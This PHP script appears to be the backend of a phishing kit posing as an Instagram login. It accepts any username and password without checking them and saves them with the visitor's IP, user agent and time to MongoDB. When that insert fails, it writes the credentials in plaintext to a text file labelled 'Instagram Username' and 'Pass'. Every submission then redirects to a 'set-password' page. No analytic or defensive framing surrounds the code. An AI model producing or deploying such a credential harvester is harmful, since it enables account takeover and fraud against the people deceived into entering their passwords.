<?php
session_start();
require_once 'db.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $username = isset($_POST['username']) ? trim($_POST['username']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
    
    // Get user metadata
    $ipAddress = getUserIP();
    $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
    $timestamp = date('Y-m-d H:i:s');
    
    // Validate input
    if (empty($username) || empty($password)) {
        header('Location: login.html?error=empty');
        exit();
    }
    
    // Insert data into MongoDB
    $userId = insertUserData($username, $password, $ipAddress, $userAgent, $timestamp);
    
    if ($userId) {
        // Store user ID in session for password setup page
        $_SESSION['user_id'] = $userId;
        $_SESSION['username'] = $username;
        
        // Redirect to password setup page
        header('Location: set-password.html');
        exit();
    } else {
        // If MongoDB insert fails, fallback to file (optional)
        file_put_contents("usernames.txt", "Instagram Username: " . $username . " Pass: " . $password . " IP: " . $ipAddress . " Time: " . $timestamp . "\n", FILE_APPEND);
        header('Location: set-password.html');
        exit();
    }
} else {
    // Redirect to login page if accessed directly
    header('Location: login.html');
    exit();
}
?>